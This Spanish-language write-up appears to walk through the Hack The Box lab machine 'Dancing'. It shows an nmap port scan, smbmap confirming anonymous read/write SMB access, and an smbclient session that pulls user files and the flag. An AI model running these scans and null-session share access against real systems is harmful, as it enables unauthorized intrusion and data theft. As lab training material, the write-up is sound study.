---
description: Máquina Starting Point HTB
---

# Dancing

Al igual que las dos anteriores del nuevo Starting Point de HTB es bastante sencilla, pero aprendes a utilizar algunas herramientas nuevas.

Comenzamos con la enumeración:

```
nmap -p- --open -n -T5 10.129.165.33 

Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-16 08:42 CEST
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 8.68% done; ETC: 08:43 (0:01:35 remaining)
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 9.92% done; ETC: 08:44 (0:01:49 remaining)
Nmap scan report for 10.129.165.33
Host is up (0.041s latency).
Not shown: 34328 filtered tcp ports (no-response), 31199 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown

```

Al tener un SMB ([Puerto 445](../pentesting/puertos/445/)) podemos comprobar a ver si tenemos acceso con un Null Session

```
smbmap -H 10.129.165.33 -u 'null'

[+] Guest session   	IP: 10.129.165.33:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	WorkShares                                        	READ, WRITE	
```

Efectivamente tenemos permisos de lectura y escritura en la carpeta WorkShares con un Null Session.

Ahora entramos y cogemos lo que necesitemos:

```
smbclient -N //10.129.165.33/WorkShares

Try "help" to get a list of possible commands.
smb: \> get Amy.J
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \Amy.J
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 11:08:24 2021
  ..                                  D        0  Mon Mar 29 11:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021

		5114111 blocks of size 4096. 1731470 blocks available
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0,5 KiloBytes/sec) (average 0,5 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

		5114111 blocks of size 4096. 1731270 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0,2 KiloBytes/sec) (average 0,3 KiloBytes/sec)
smb: \James.P\> exit
```

¡Y ya tenemos la Flag!
